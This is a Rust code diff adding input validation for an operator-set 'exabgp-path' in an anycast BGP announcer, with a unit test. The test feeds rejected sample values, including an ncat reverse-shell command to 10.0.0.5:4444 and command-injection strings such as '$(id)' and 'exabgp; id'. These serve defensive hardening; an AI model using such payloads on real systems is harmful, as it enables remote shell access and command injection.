@@ -108,6 +108,26 @@ pub fn generate_exabgp_conf(cfg: &AnycastConfig) -> Result<String> {
     ))
 }
 
+/// Defense-in-depth validation of an operator-supplied `exabgp-path` (audit SEC-K1).
+///
+/// `exabgp-path` is config-file-only (no REST setter), so an operator who can set it can
+/// already write the config as root — this is hardening, not a privilege boundary. But the
+/// value is passed to `Command::new` (which does NOT split arguments or invoke a shell), so we
+/// reject anything that could only make sense as a command *line* — whitespace or shell
+/// metacharacters — so a fat-fingered `exabgp-path: "exabgp --foo"` fails fast with a clear
+/// error instead of trying to exec a file literally named `exabgp --foo`.
+fn validate_exabgp_path(path: &str) -> Result<()> {
+    if path.is_empty()
+        || path.chars().any(|c| {
+            c.is_whitespace()
+                || matches!(c, ';' | '|' | '&' | '$' | '(' | ')' | '<' | '>' | '`' | '*' | '?' | '\n' | '\r')
+        })
+    {
+        bail!("anycast: 'exabgp-path' = '{path}' must be a bare executable path (no whitespace or shell metacharacters)");
+    }
+    Ok(())
+}
+
 /// Supervises the exabgp child. `announce()` = start (route up); `withdraw()` = stop (route
 /// gone). Dropping the announcer withdraws (graceful drain on shutdown).
 pub struct AnycastAnnouncer {
@@ -121,6 +141,12 @@ impl AnycastAnnouncer {
     /// Validate the config and write the exabgp config (in Runbound's runtime dir). Does not announce yet.
     pub fn prepare(cfg: &AnycastConfig) -> Result<Self> {
         let conf = generate_exabgp_conf(cfg)?;
+        if let Some(p) = &cfg.exabgp_path {
+            validate_exabgp_path(p)?;
+            if !std::path::Path::new(p).is_file() {
+                bail!("anycast: 'exabgp-path' = '{p}' does not exist or is not a regular file");
+            }
+        }
         let conf_path = conf_path();
         std::fs::write(&conf_path, &conf)
             .with_context(|| format!("anycast: writing {}", conf_path.display()))?;
@@ -238,5 +264,18 @@ mod tests {
         let mut c3 = sample();
         c3.local_address = Some("not an ip".into());
         assert!(generate_exabgp_conf(&c3).is_err());
+    }
+
+    #[test]
+    fn exabgp_path_rejects_command_line_values() {
+        // SEC-K1: a value that could only be a command line (args / shell metacharacters) is
+        // rejected, so it can never be mistaken for an executable path by Command::new.
+        assert!(validate_exabgp_path("/usr/sbin/exabgp").is_ok());
+        assert!(validate_exabgp_path("exabgp").is_ok());
+        assert!(validate_exabgp_path("/usr/bin/ncat -e /bin/bash 10.0.0.5 4444").is_err());
+        assert!(validate_exabgp_path("exabgp; id").is_err());
+        assert!(validate_exabgp_path("$(id)").is_err());
+        assert!(validate_exabgp_path("a`id`b").is_err());
+        assert!(validate_exabgp_path("").is_err());
     }
 }
